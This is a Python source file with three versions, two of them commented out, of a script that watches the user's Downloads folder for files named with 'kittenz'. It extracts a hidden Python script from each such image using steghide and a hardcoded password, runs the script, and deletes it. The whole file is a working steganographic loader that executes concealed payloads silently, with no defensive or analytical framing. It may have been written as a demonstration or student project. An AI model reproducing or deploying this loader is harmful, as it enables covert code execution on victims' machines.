# # import time
# # import os
# # from watchdog.observers import Observer
# # from watchdog.events import FileSystemEventHandler
# # import subprocess
# # from pathlib import Path

# # # Folder to monitor (Downloads folder)
# # DOWNLOADS_FOLDER = Path.home() / "Downloads"
# # SIGNATURE = "kittenz"
# # STEGO_PASSWORD = "secret123"

# # python_path = r"C:\Python312\python.exe"
# # steghide_path = r"E:\steghide\steghide.exe"

# # def extract_payload(image_path):
# #     # print("This line is executing")
# #     extracted_file = DOWNLOADS_FOLDER / "extracted_payload.py"
# #     cmd = [
# #         steghide_path, "extract",
# #         "-sf", str(image_path),
# #         "-p", STEGO_PASSWORD,
# #         "-xf", str(extracted_file)
# #     ]

# #     result = subprocess.run(cmd, capture_output=True, text=True)

# #     # Combine stdout and stderr for checking message
# #     combined_output = result.stdout.lower() + result.stderr.lower()

# #     if result.returncode == 0:
# #         return extracted_file
# #     else:
# #         # print(f"[-] Extraction failed: {result.stderr.strip() or result.stdout.strip()}")
# #         return None

# # def execute_payload(script_path):
# #     try:
# #         print(f"[+] Executing payload")
# #         subprocess.run([python_path, str(script_path)])
# #     except Exception as e:
# #         print(f"[!] Execution failed")
# #     finally:
# #         os.remove(script_path)

# # class DownloadFolderHandler(FileSystemEventHandler):

# #     def on_modified(self, event):
# #         # To avoid noisy directory modification events
# #         time.sleep(5)
# #         if not event.is_directory:
# #             if SIGNATURE in str(event.src_path):
                
# #                 time.sleep(5)
                
# #                 payload = extract_payload(event.src_path)
# #                 if payload:
# #                     print(f"[+] Suspicious image detected")
# #                     print(f"[+] Payload extracted")
# #                     execute_payload(payload)

# # if __name__ == "__main__":
# #     event_handler = DownloadFolderHandler()
# #     observer = Observer()
# #     observer.schedule(event_handler, DOWNLOADS_FOLDER, recursive=False)
# #     observer.start()
    
# #     print(f"Monitoring Image Downloads")
# #     try:
# #         while True:
# #             time.sleep(1)
# #     except KeyboardInterrupt:
# #         observer.stop()
# #     observer.join()

# import time
# import os
# import threading
# import subprocess
# from pathlib import Path
# from watchdog.observers import Observer
# from watchdog.events import FileSystemEventHandler

# # Folder to monitor (Downloads folder)
# DOWNLOADS_FOLDER = Path.home() / "Downloads"
# SIGNATURE = "kittenz"
# STEGO_PASSWORD = "secret123"

# python_path = r"C:\Python312\python.exe"
# steghide_path = r"E:\steghide\steghide.exe"

# # Set to track recently processed files
# recent_files = set()

# def remove_from_recent(file):
#     time.sleep(10)
#     recent_files.discard(file)

# def extract_payload(image_path):
#     extracted_file = DOWNLOADS_FOLDER / "extracted_payload.py"
#     cmd = [
#         steghide_path, "extract",
#         "-sf", str(image_path),
#         "-p", STEGO_PASSWORD,
#         "-xf", str(extracted_file)
#     ]

#     result = subprocess.run(cmd, capture_output=True, text=True)

#     if result.returncode == 0:
#         return extracted_file
#     else:
#         return None

# def execute_payload(script_path):
#     try:
#         print(f"[+] Executing payload")
#         subprocess.run([python_path, str(script_path)])
#     except Exception as e:
#         print(f"[!] Execution failed: {e}")
#     finally:
#         os.remove(script_path)

# class DownloadFolderHandler(FileSystemEventHandler):

#     def on_modified(self, event):
#         if event.is_directory:
#             return

#         file_path = Path(event.src_path)
#         filename = file_path.name

#         if SIGNATURE not in filename:
#             return

#         # Avoid reprocessing the same file
#         if filename in recent_files:
#             return

#         # Mark as recently handled
#         recent_files.add(filename)
#         threading.Thread(target=remove_from_recent, args=(filename,), daemon=True).start()

#         time.sleep(5)  # Let it finish writing

#         payload = extract_payload(file_path)
#         if payload:
#             print(f"[+] Suspicious image detected")
#             print(f"[+] Payload extracted")
#             execute_payload(payload)

# if __name__ == "__main__":
#     event_handler = DownloadFolderHandler()
#     observer = Observer()
#     observer.schedule(event_handler, DOWNLOADS_FOLDER, recursive=False)
#     observer.start()

#     print(f"[*] Monitoring Image Downloads...")
#     try:
#         while True:
#             time.sleep(1)
#     except KeyboardInterrupt:
#         observer.stop()
#     observer.join()

import time
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import subprocess
from pathlib import Path

# Folder to monitor (Downloads folder)
DOWNLOADS_FOLDER = Path.home() / "Downloads"
SIGNATURE = "kittenz"
STEGO_PASSWORD = "secret123"

python_path = r"C:\Python312\python.exe"
steghide_path = r"E:\steghide\steghide.exe"

def extract_payload(image_path):
    # print("This line is executing")
    extracted_file = "extracted_payload.py"
    cmd = [
        steghide_path, "extract",
        "-sf", str(image_path),
        "-p", STEGO_PASSWORD,
        "-xf", str(extracted_file)
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    # Combine stdout and stderr for checking message
    combined_output = result.stdout.lower() + result.stderr.lower()

    if result.returncode == 0:
        return extracted_file
    else:
        # print(f"[-] Extraction failed: {result.stderr.strip() or result.stdout.strip()}")
        return None

def execute_payload(script_path):
    try:
        print(f"[+] Executing payload")
        subprocess.run([python_path, str(script_path)])
    except Exception as e:
        print(f"[!] Execution failed")
    finally:
        os.remove(script_path)

class DownloadFolderHandler(FileSystemEventHandler):

    def on_modified(self, event):
        if not event.is_directory:
            if SIGNATURE in str(event.src_path):
                
                time.sleep(5)
                
                payload = extract_payload(event.src_path)
                if payload:
                    print(f"[+] Suspicious image detected")
                    print(f"[+] Payload extracted")
                    execute_payload(payload)

if __name__ == "__main__":
    event_handler = DownloadFolderHandler()
    observer = Observer()
    observer.schedule(event_handler, DOWNLOADS_FOLDER, recursive=False)
    observer.start()
    
    print(f"Monitoring Image Downloads")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()